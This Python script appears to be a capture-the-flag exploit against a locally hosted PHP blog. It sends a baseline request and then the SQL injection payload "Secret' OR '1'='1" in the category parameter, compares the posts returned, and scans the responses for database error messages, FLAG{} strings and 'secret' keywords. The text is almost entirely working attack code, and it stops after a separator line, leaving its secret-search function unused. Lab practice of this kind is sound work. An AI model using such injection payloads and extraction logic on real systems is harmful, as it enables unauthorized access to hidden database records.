import requests
from bs4 import BeautifulSoup
import re
import time

base_url = "http://127.0.0.1:33130"

def safe_request(url, label):
    """Safely send request with error handling"""
    try:
        print(f"[+] Sending {label} request to: {url}")
        resp = requests.get(url, timeout=15)
        print(f"[+] {label} status: {resp.status_code} | Content length: {len(resp.content)}B")
        return resp
    except requests.exceptions.ConnectionError:
        print(f"[!] {label}: Connection error - server may not be running or port incorrect")
        return None
    except requests.exceptions.Timeout:
        print(f"[!] {label}: Request timed out after 15 seconds")
        return None
    except Exception as e:
        print(f"[!] {label}: Unexpected error: {str(e)}")
        return None

# Send baseline request
baseline_resp = safe_request(f"{base_url}/?category=Secret", "BASELINE")

# Small delay to be nice to the server
time.sleep(0.5)

# Send SQL injection request
injection_resp = safe_request(f"{base_url}/?category=Secret' OR '1'='1", "SQL INJECTION")

if not baseline_resp or not injection_resp:
    print("\n[!] FAILED: Could not retrieve one or both responses")
    exit(1)

# Parse both responses
baseline_soup = BeautifulSoup(baseline_resp.text, 'html.parser')
injection_soup = BeautifulSoup(injection_resp.text, 'html.parser')

def extract_posts(soup, label):
    """Extract all posts from the parsed HTML"""
    posts = []
    
    # Method 1: Look for common post containers
    post_containers = soup.find_all(['div', 'article', 'section'], class_=lambda x: x and 'post' in x.lower())
    
    # Method 2: Look for specific patterns
    if not post_containers:
        post_containers = soup.find_all('div', {'class': 'post'})
    
    # Method 3: Look for blog post patterns
    if not post_containers:
        post_containers = soup.select('div.post, article.post, section.post, .blog-post')
    
    # Method 4: Look for h2/h3 headings that might be post titles
    if not post_containers:
        headings = soup.find_all(['h1', 'h2', 'h3', 'h4'])
        for heading in headings:
            # Skip if it's likely a page title or navigation
            if any(word in heading.get_text().lower() for word in ['home', 'about', 'contact', 'nav', 'menu']):
                continue
            content = heading.find_next(['p', 'div'])
            if content:
                posts.append({
                    'title': heading.get_text(strip=True),
                    'content': content.get_text(strip=True)
                })
    else:
        for container in post_containers:
            # Extract title - try multiple selectors
            title_elem = None
            for selector in ['h1', 'h2', 'h3', 'h4', 'h5', '.post-title', '.title']:
                title_elem = container.select_one(selector)
                if title_elem:
                    break
            
            # Extract content - try multiple selectors
            content_elem = None
            for selector in ['p', '.post-content', '.content', '.post-body', 'div:not([class*="title"])']:
                content_elem = container.select_one(selector)
                if content_elem:
                    break
            
            title = title_elem.get_text(strip=True) if title_elem else "No title"
            content = content_elem.get_text(strip=True) if content_elem else "No content"
            
            posts.append({
                'title': title,
                'content': content
            })
    
    print(f"\n{'='*80}")
    print(f"{label} POSTS ({len(posts)} total):")
    print(f"{'='*80}")
    
    for i, post in enumerate(posts, 1):
        content_preview = post['content'][:200]
        if len(post['content']) > 200:
            content_preview += "..."
        print(f"\n[{i}] Title: {post['title']}")
        print(f"     Content: {content_preview}")
    
    return posts

# Extract posts from both responses
baseline_posts = extract_posts(baseline_soup, "BASELINE")
injection_posts = extract_posts(injection_soup, "SQL INJECTION")

# Compare post counts
print(f"\n{'='*80}")
print("COMPARISON SUMMARY:")
print(f"{'='*80}")
print(f"Baseline posts: {len(baseline_posts)}")
print(f"Injection posts: {len(injection_posts)}")
print(f"Difference: {len(injection_posts) - len(baseline_posts)} additional posts")

# Find posts that appear in injection but not baseline
baseline_titles = {post['title'] for post in baseline_posts}
new_posts = [post for post in injection_posts if post['title'] not in baseline_titles]

if new_posts:
    print(f"\n[!!!] NEW POSTS REVEALED BY SQL INJECTION ({len(new_posts)}):")
    print(f"{'='*80}")
    for i, post in enumerate(new_posts, 1):
        print(f"\n[{i}] Title: {post['title']}")
        print(f"     Content: {post['content']}")
else:
    print("\n[-] No new posts revealed (posts are identical or just different order)")

    # Check if posts are just in different order
    if len(baseline_posts) == len(injection_posts) and baseline_posts != injection_posts:
        print("[!] Posts are the same count but different order - SQL injection may have changed ordering")

# Look for PHP error messages in both responses
def find_php_errors(text, label):
    php_error_patterns = [
        r'Warning:.*?\.php.*',
        r'Fatal error:.*?\.php.*',
        r'Parse error:.*?\.php.*',
        r'Notice:.*?\.php.*',
        r'SQL syntax.*',
        r'mysql_.*?error',
        r'PDOException.*',
        r'You have an error in your SQL syntax.*',
        r'Unknown column.*',
        r'Table .* doesn\'t exist.*',
        r'Database error.*',
        r'Query failed.*'
    ]
    
    errors = []
    for pattern in php_error_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE | re.MULTILINE | re.DOTALL)
        errors.extend(matches)
    
    if errors:
        print(f"\n[+] PHP/MySQL Errors in {label}:")
        print(f"{'='*80}")
        for i, error in enumerate(errors[:3], 1):  # Show max 3 to avoid spam
            error_clean = re.sub(r'\s+', ' ', error.strip())
            print(f"[{i}] {error_clean[:150]}{'...' if len(error_clean) > 150 else ''}")
        if len(errors) > 3:
            print(f"    ... and {len(errors) - 3} more errors")
    else:
        print(f"\n[-] No PHP/MySQL errors found in {label}")
    
    return errors

print(f"\n{'='*80}")
print("ERROR MESSAGE ANALYSIS:")
print(f"{'='*80}")
baseline_errors = find_php_errors(baseline_resp.text, "BASELINE")
injection_errors = find_php_errors(injection_resp.text, "SQL INJECTION")

# Look for flags in both responses
def find_flags(text, label):
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, text)
    
    if flags:
        print(f"\n[!!!] FLAGS FOUND in {label}:")
        print(f"{'='*80}")
        for flag in flags:
            print(f"    - {flag}")
    else:
        print(f"\n[-] No FLAG{{}} patterns found in {label}")
    
    return flags

print(f"\n{'='*80}")
print("FLAG SEARCH:")
print(f"{'='*80}")
baseline_flags = find_flags(baseline_resp.text, "BASELINE")
injection_flags = find_flags(injection_resp.text, "SQL INJECTION")

# Look for secret indicators
def find_secrets(text, label):
    secret_patterns = [
        r'secret[\w\s]*',
        r'hidden[\w\s]*',
        r'confidential[\w\s]*',
        r'private[\w\s]*',
        r'CLASSIFIED[\w\s]*',
        r'TOP SECRET[\w\s]*'
    ]
    
    secrets = []
    for pattern in secret_patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        secrets.extend(matches)
    
    unique_secrets = list(set(secrets))  # Remove duplicates
    
    if unique_secrets:
        print(f"\n[+] Secret indicators in {label} ({len(unique_secrets)} unique found)")
        print(f"{'='*80}")
        for i, secret in enumerate(unique_secrets[:5], 1):  # Show max 5
            secret_clean = re.sub(r'\s+', ' ', secret.strip())
            if len(secret_clean) > 10:  # Only show meaningful matches
                print(f"[{i}] {secret_clean[:100]}")
        if len(unique_secrets) > 5:
            print(f"    ... and {len(unique_secrets) - 5} more")
    else:
        print(f"\n[-] No obvious secret indicators in {label}")
    
    return unique_secrets

print(f"\n{'='*80}")
